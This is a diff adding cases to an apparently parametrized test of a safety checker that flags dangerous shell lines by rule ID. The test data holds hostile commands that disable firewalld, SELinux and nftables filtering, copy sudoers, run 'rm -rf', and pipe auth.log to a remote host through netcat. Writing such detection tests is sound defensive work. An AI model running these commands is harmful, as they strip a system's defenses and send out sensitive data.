@@ -712,6 +712,11 @@ class TestSafetyChecks:
             ("find / | grep passwd\n", "SEC-588"),
             ("sed -i s/x/y/ app.conf\n", "SEC-589"),
             ("rm -rf backup\n", "SEC-590"),
+            ("systemctl disable firewalld\n", "SEC-591"),
+            ("rmmod selinux\n", "SEC-592"),
+            ("nft delete table inet filter\n", "SEC-593"),
+            ("cp sudoers /tmp/\n", "SEC-594"),
+            ("cat auth.log | nc host 4444\n", "SEC-595"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
